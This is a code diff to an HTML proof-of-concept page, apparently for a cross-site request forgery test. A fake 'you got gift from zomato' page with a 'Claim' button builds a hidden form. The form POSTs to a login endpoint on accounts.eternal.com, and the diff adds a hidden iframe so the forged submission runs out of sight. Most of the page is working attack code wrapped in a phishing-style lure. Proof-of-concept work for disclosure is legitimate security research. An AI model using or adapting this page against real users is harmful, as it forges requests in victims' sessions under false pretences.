@@ -7,8 +7,17 @@
 <body>
  <h1>you got gift from zomato</h1>
  <button onclick="csrfPoc()">Claim</button>
+ <iframe name="hiddenFrame" style="display:none;"></iframe>
 
   <script>
+    function createInput() {
+      const input = document.createElement("input");
+      input.type = "number";
+      input.name = "angka";
+      input.value = "12345";
+
+  document.body.appendChild(input);
+}
     function csrfPoc() {
       var targetUrl = "https://accounts.eternal.com/login/email";
 
@@ -29,6 +38,7 @@
       form.action = targetUrl;
       form.method = "POST";
       form.enctype = "multipart/form-data";
+      form.target = "hiddenFrame";
 
       // Dynamically add each field as a hidden input
       for (var key in fields) {
